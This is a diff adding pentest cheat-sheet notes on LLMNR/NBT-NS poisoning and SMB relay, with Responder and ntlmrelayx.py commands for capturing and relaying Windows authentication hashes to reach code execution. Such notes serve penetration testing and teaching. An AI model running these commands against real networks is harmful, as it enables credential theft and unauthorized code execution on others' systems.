@@ -1,3 +1,21 @@
+# LLMNR/NBT-NS Poisoning
+- By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.
+```bash
+responder -I eth0 -rdwv
+```
+
+# SMB Relay
+- The **SMB Signing** has to be disabled.
+- The file **/usr/share/responder/Responde.conf** has to be modified:
+
+  ![image](https://user-images.githubusercontent.com/43812413/200524235-2253f2c2-9838-46f3-86c3-ac2233869cc9.png)
+- Once we have modified the file we will start **responder** and **ntlmrelayx.py** in order to relay the hashes to targets:
+  ```bash
+  python Responder.py -l tun0 -rdw
+  
+  python ntlmrelayx.py -tf targets.txt -smb2support
+  ```
+- If the attack is successful, we will gain code execution.
 # Enumeration
 - Enumerate all local accounts
 ```bat
